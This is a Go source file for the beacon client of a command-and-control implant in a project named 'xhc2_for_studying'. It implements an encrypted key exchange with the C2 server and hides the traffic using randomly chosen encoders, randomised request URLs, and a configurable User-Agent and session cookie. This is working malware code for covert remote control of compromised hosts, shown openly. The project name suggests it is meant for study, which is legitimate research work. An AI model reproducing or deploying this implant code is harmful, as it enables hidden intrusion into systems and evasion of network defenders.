// Package client provides the HTTP client for beacon communication with the C2 server.
package client

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/protocol"
)

// Client is an HTTP client that communicates with the C2 server using
// encrypted and encoded requests. It manages the session state including
// key exchange, cipher context, and session token.
type Client struct {
	baseURL              string
	pathPrefix           string
	httpClient           *http.Client
	c2Profile            *protocol.C2Profile
	extMap               *protocol.ExtensionMap
	implantAgePublicKey  string
	implantAgePrivateKey string
	serverPublicKey      string
	cipherCtx            *protocol.CipherContext // symmetric encryption context, set after handshake.
	sessionToken         string                  // session token assigned by the server.
}

// NewClient creates a new Client from the given beacon configuration.
func NewClient(cfg *config.BeaconConfig) (*Client, error) {
	if cfg == nil {
		return nil, errors.New("beacon config is nil")
	}
	if cfg.ServerURL == "" {
		return nil, errors.New("server url is empty")
	}

	return &Client{
		baseURL:    strings.TrimRight(cfg.ServerURL, "/"),
		pathPrefix: cfg.PathPrefix,
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
		c2Profile:            &cfg.C2Profile,
		extMap:               &cfg.ExtMap,
		implantAgePublicKey:  cfg.ImplantAgePublicKey,
		implantAgePrivateKey: cfg.ImplantAgePrivateKey,
		serverPublicKey:      cfg.ServerPublicKey,
	}, nil
}

// KeyExchange performs the handshake with the C2 server.
// It generates a symmetric key, builds a key exchange packet
// (HMAC with the implant private key, then Age-encrypted, prefixed
// with a public key hash), encodes it, and sends it to the server.
// On success the session token and cipher context are stored for
// subsequent communication.
func (c *Client) KeyExchange() error {
	// 1. Generate a random symmetric key.
	sKey, err := protocol.GenerateSymmetricKey()
	if err != nil {
		return err
	}

	// 2. Create a local CipherContext from the key.
	cipherCtx, err := protocol.NewCipherContext(sKey)
	if err != nil {
		return err
	}

	// 3. Build the key exchange packet: [SHA256(pubkey) || AgeEncrypt(HMAC || sKey)].
	packet, err := protocol.BuildKeyExchangePacket(
		sKey,
		c.implantAgePublicKey,
		c.implantAgePrivateKey,
		c.serverPublicKey,
	)
	if err != nil {
		return fmt.Errorf("build key exchange packet: %w", err)
	}

	// 4. Pick a random encoder, encode the packet, and construct the URL
	//    embedding the encoder negotiation nonce.
	enc := protocol.RandomEncoder()
	reqBody, err := enc.Encode(packet)
	if err != nil {
		return fmt.Errorf("encode key exchange: %w", err)
	}
	encoderNonce := protocol.GenerateNonce(enc.ID(), c.c2Profile.EncoderModulus)

	reqURL, err := buildRandomURL(c.baseURL, c.pathPrefix, c.c2Profile, c.extMap.KeyExchange)
	if err != nil {
		return err
	}
	embedEncoderNonce(reqURL, encoderNonce)

	httpReq, err := http.NewRequest(http.MethodPost, reqURL.String(), bytes.NewReader(reqBody))
	if err != nil {
		return err
	}
	c.applyRequestHeaders(httpReq, true)

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return err
	}
	defer func() { _ = resp.Body.Close() }()

	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("key exchange failed with status %d: %s", resp.StatusCode, string(rawBody))
	}

	// 5. Decode the response with the same encoder, then decrypt it
	//    to extract the session token.
	decoded, err := enc.Decode(rawBody)
	if err != nil {
		return fmt.Errorf("decode key exchange response: %w", err)
	}

	plaintext, err := cipherCtx.Decrypt(decoded)
	if err != nil {
		return fmt.Errorf("decrypt key exchange response: %w", err)
	}
	c.sessionToken = string(plaintext)

	// 6. Save the CipherContext for subsequent communication.
	c.cipherCtx = cipherCtx
	return nil
}

func (c *Client) applyRequestHeaders(req *http.Request, hasBody bool) {
	if c.c2Profile.UserAgent != "" {
		req.Header.Set("User-Agent", c.c2Profile.UserAgent)
	}
	if hasBody {
		req.Header.Set("Content-Type", "application/octet-stream")
	}
	if c.sessionToken != "" {
		req.AddCookie(&http.Cookie{
			Name:  c.sessionCookieName(),
			Value: c.sessionToken,
		})
	}
}

func (c *Client) sessionCookieName() string {
	if c.c2Profile.SessionCookieName != "" {
		return c.c2Profile.SessionCookieName
	}
	return "sid"
}
